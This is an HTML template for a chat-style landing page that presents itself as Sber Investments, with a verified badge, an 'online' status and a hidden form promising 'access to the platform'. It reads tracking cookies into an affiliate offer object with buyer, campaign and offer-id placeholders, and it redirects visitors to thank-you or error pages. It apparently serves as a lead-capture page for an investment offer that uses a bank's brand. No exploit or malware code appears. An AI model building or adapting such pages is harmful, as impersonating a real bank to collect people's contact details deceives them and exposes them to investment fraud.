<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Чат</title>
    <link rel="icon" href="img/icons/logo.svg" type="image/x-icon" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Raleway:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="chat.css" />

    <script src="jquery-3.6.1.min.js"></script>

    <script src="form/js/libs/intlTelInput.js"></script>
    
    <script type="application/javascript" src="track.js?v=2332"></script>

    <script type="application/javascript">
    
        function getCookie(name) {
          var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
          return v ? v[2] : null;
        }

        // Получаем значение 'subid' из куки
        const subid_1 = getCookie("_subid");
        
        const infoFromCookie = getCookie("info");
      
        var offerData = {
          subid: subid_1,
          buyer: "{buyer}",
          crm_campaign: "{crm_campaign}",
          thank_you_page: "{thank_you_page}",
          landing_name: "offer_id_" + "{offer_id}",
          app_key: "{app_key}",
          bge: "{bge}",
          ts_id: "{ts_id}",
          info: infoFromCookie,
        };
    </script>

    
    <script type="application/javascript" src="parse_url.js?v=233432"></script>
    
    

  </head>
  <body>
    <header class="header">
      <div class="header-container">
        <div class="header-heading">
          <img src="img/icons/logo.svg" alt="Logo" />
          <div class="heading-title">
            <div class="heading-title-wrapper">
              <span class="heading-title-name">СБЕР ИНВЕСТИЦИИ</span>
              <img
                src="img/icons/checklist.svg"
                width="16px"
                height="16px"
                alt="Check icon"
              />
            </div>
            <span class="heading-subtitle">в сети</span>
          </div>
        </div>
      </div>
    </header>
    <main class="main">
      <span class="messages-date">Сегодня</span>
      <div class="main-messages"></div>
      <form
        class="form _main-form contact-form freg thin rounded"
        id="main-form"
        method="post"
        style="
          padding: 20px;
          margin: 20px 20px;
          border-radius: 20px;
          background-color: #fff;
          display: none;
        "
      >
        <h2 style="text-align: center; color: #000">
          Заполните форму и получите доступ к платформе
        </h2>
      </form>
    </main>
    <footer class="footer">
      <div class="footer-container">
        <div class="footer-menu">
          <img src="img/icons/Menu-Icon.svg" alt="Menu" />
          <span class="footer-menu-text">Меню</span>
        </div>
        <div class="footer-input">
          <img src="img/icons/Cursor.svg" alt="Cursor" />
          <span class="footer-input-placeholder">Сообщение</span>
        </div>
      </div>
      <div class="footer-send">
        <img src="img/icons/send.svg" alt="Send" />
      </div>
    </footer>
    <script type="module" src="chat.js?v=34"></script>

    <script src="loadAssets.js?v=3456"></script>

   <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks2.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks2.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
